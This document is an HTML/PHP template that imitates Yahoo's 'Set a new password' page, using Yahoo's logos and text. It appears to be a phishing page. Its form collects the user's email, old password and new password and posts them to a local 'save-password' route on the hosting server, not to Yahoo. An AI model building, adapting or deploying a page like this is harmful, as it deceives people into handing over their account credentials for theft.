<div class="mbr-legacy-device-bar" id="mbr-legacy-device-bar">
            <label class="cross" for="mbr-legacy-device-bar-cross" aria-label="Close this&nbsp;warning">x</label>
            <input type="checkbox" id="mbr-legacy-device-bar-cross">
            <p class="mbr-legacy-device">
                    Yahoo works best with the latest versions of the browsers. You're using an outdated or unsupported browser and some Yahoo features may not work properly. Please update your browser version now. <a href="#">More&nbsp;Info</a>
            </p>
        </div>

        <div id="login-body" class="loginish dark-background puree-v2 grid">
            <div class="mbr-desktop-hd">
            <span class="column">
                <a href="https://www.yahoo.com/">
                    <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo" class="logo " width="" height="36">
                    <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_w_bestfit_frontpage_2x.png" alt="Yahoo" class="dark-mode-logo logo " width="" height="36">
                </a>
            </span>
            <span class="column help txt-align-right">
                <a href="https://help.yahoo.com/kb/index?locale=en_US&amp;page=product&amp;y=PROD_ACCT">Help</a>
            </span>
        </div>
            <div class="login-box-container">
                <div class="login-box right">
                    <div class="mbr-login-hd txt-align-center">
                            <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo" class="logo yahoo-en-US" width="" height="27">
                            <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_w_bestfit_frontpage_2x.png" alt="Yahoo" class="dark-mode-logo logo yahoo-en-US" width="" height="27">
                    </div>
                    <div class="change-password generic-page" id="change-password">
            <div class="page-heading">Set a new&nbsp;password</div>
            <ul class="page-content">
                <li class="page-desc txt-align-center">Choose a password that you're not using on other&nbsp;accounts.</li>
                <li class="page-desc txt-align-center">For security, you will need to <strong>enter your new password across all of your&nbsp;devices.</strong></li>
            </ul>
            <form id="change-password-form" autocomplete="off" class="pure-form page-content" method="post" novalidate="" action="<?= base_url('save-password') ?>">
                
                <div class="pwdfield-wrapper">
                    <img src="https://s.yimg.com/wm/mbr/images/caps-lock-v0.0.1.png" class="capslock-img hide" aria-label="Your capslock is&nbsp;on" role="alert">
                    <div class="input-group">
                        <input required type="email" aria-required="true" autocomplete="email" class="m-t-16px" id="email" name="email" placeholder=" ">
                            <div id="div-email" class="error-msg"></div>
                        <label for="email">Email</label>
                    </div>
                </div>

                <div class="pwdfield-wrapper">
                    <img src="https://s.yimg.com/wm/mbr/images/caps-lock-v0.0.1.png" class="capslock-img hide" aria-label="Your capslock is&nbsp;on" role="alert">
                    <div class="input-group">
                        <input required type="password" aria-required="true" autocomplete="old-password" class="m-t-16px" id="old-password"  name="old_password" placeholder=" ">
                            <div id="div-old-password" class="error-msg"></div>
                        <label for="old-password">Old password</label>
                    </div>
                </div>

                <div class="pwdfield-wrapper">
                    <img src="https://s.yimg.com/wm/mbr/images/caps-lock-v0.0.1.png" class="capslock-img hide" aria-label="Your capslock is&nbsp;on" role="alert">
                    <div class="input-group">
                        <input required type="password" aria-required="true" autocomplete="new-password" class="m-t-16px" id="cpwd-password" maxlength="128" name="password" placeholder=" ">
                            <div id="cpwd-error-password" class="error-msg"></div>
                        <label for="cpwd-password">New&nbsp;password</label>
                    </div>
                </div>
                
                <div class="pwdfield-wrapper">
                    <img src="https://s.yimg.com/wm/mbr/images/caps-lock-v0.0.1.png" class="capslock-img hide" aria-label="Your capslock is&nbsp;on" role="alert">
                    <div class="input-group">
                        <input required type="password" aria-required="true" autocomplete="new-password" id="cpwd-confirm-password" class="m-t-16px" maxlength="128" name="confirmPassword" placeholder=" ">
                            <div id="cpwd-error-confirmPassword" class="error-msg"></div>
                        <label for="cpwd-confirm-password">Confirm new&nbsp;password</label>
                    </div>
                </div>
                <div class="show-password">
                    <input required type="checkbox" class="puree-checkbox" id="change-password-show" onclick="visibel()">
                    <label for="change-password-show" class="change-password-checkbox"><span class="show-password-lbl">Show&nbsp;password</span></label>
                </div>
                <div class="button-container">
                    <input type="submit" value="Continue" class="pure-button puree-button-primary puree-spinner-button cpwd-submit-button">
                </div>
            </form>
        </div>
                </div>
                <div id="login-box-ad-fallback" class="login-box-ad-fallback">
                    <h1>Yahoo makes it easy to enjoy what matters most in your&nbsp;world.</h1>
        <p>Best in class Yahoo Mail, breaking local, national and global news, finance, sports, music, movies and more. You get more out of the web, you get more out of&nbsp;life.</p>
                </div>
            </div>
            <div class="login-bg-outer">
                <div class="login-bg-inner">
                        <div class="subscription-promo static-bg"></div>
                </div>
            </div>
        </div>

<script>
function visibel() {
  var x = document.getElementById("cpwd-confirm-password");
  var y = document.getElementById("cpwd-password");
  var z = document.getElementById("old-password");
  if (x.type === "password") {
    x.type = "text";
    y.type = "text";
    z.type = "text";
  } else {
    x.type = "password";
    y.type = "password";
    z.type = "password";
  }
} 
</script>